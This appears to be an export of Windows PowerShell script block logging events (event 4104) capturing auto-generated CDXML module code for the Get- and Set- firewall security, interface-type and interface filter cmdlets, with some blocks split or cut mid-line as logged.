            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteMachines'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteMachines'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallSecurityFilter.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetFirewallSecurityFilter' -Alias '*'
        


ScriptBlock ID: 0dc863ff-fa95-4d79-ab00-e5f9a0b59a67
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (1 of 2):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetNetworkLayerSecurityFilter'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Get-NetFirewallSecurityFilter
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetNetworkLayerSecurityFilter')]

    param(
    
    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Authentication[]]
    ${Authentication},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Encryption[]]
    ${Encryption},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${OverrideBlockRules},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${LocalUser},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${RemoteUser},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${RemoteMachine},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Authentication') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Authentication})
        $__cmdletization_queryBuilder.FilterByProperty('Authentication', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Encryption') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Encryption})
        $__cmdletization_queryBuilder.FilterByProperty('Encryption', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('OverrideBlockRules') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${OverrideBlockRules})
        $__cmdletization_queryBuilder.FilterByProperty('OverrideBlockRules', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('LocalUser') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${LocalUser})
        $__cmdletization_queryBuilder.FilterByProperty('LocalUsers', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RemoteUser') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RemoteUser})
        $__cmdletization_queryBuilder.FilterByProperty('RemoteUsers', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RemoteMachine') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RemoteMachine})
        $__cmdletization_queryBuilder.FilterByProperty('RemoteMachines', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallRule') -and (@('ByAssociatedNetFirewallRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallRule}, 'MSFT_NetFirewallRuleFilterBySecurity', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByQuery', 'ByAssociatedNetFirewallRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByQuery', 'ByAssociatedNetFirewallRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallSecurityFilter.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetFirewallSecurityFilter' -Alias '*'
        

function Set-NetFirewallSecurityFilter
{
    [CmdletBinding(DefaultParameterSetName='Query (cdxml)', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetNetworkLayerSecurityFilter')]

    param(
    
    [Parameter(ParameterSetName='Query (cdxml)')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetNetworkLayerSecurityFilter')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Authentication]
    ${Authentication},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Encryption]
    ${Encryption},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [bool]
    ${OverrideBlockRules},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${LocalUser},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${RemoteUser},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${RemoteMachine},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletiza

ScriptBlock ID: 0dc863ff-fa95-4d79-ab00-e5f9a0b59a67
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetInterfaceTypeFilter'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Get-NetFirewallInterfaceTypeFilter
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceTypeFilter')]

    param(
    
    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.InterfaceType[]]
    ${InterfaceType},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallRule},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('InterfaceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${InterfaceType})
        $__cmdletization_queryBuilder.FilterByProperty('InterfaceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallRule') -and (@('ByAssociatedNetFirewallRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallRule}, 'MSFT_NetFirewallRuleFilterByInterfaceType', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecRule') -and (@('ByAssociatedNetIPsecRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecRule}, 'MSFT_NetConSecRuleFilterByInterfaceType', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByQuery', 'ByAssociatedNetFirewallRule', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByQuery', 'ByAssociatedNetFirewallRule', 'ByAssociatedNetIPsecRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallInterfaceTypeFilter.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetFirewallInterfaceTypeFilter' -Alias '*'
        

function Set-NetFirewallInterfaceTypeFilter
{
    [CmdletBinding(DefaultParameterSetName='Query (cdxml)', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceTypeFilter')]

    param(
    
    [Parameter(ParameterSetName='Query (cdxml)')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetInterfaceTypeFilter')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.InterfaceType]
    ${InterfaceType},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('Query (cdxml)', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('InterfaceType')) {
            [object]$__cmdletization_value = ${InterfaceType}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InterfaceType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.InterfaceType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InterfaceType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.InterfaceType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallInterfaceTypeFilter.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetFirewallInterfaceTypeFilter' -Alias '*'
        


ScriptBlock ID: 0e281436-fc6d-4754-aada-4665ba99e2c1
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetInterfaceFilter'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Get-NetFirewallInterfaceFilter
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceFilter')]

    param(
    
    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallRule},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
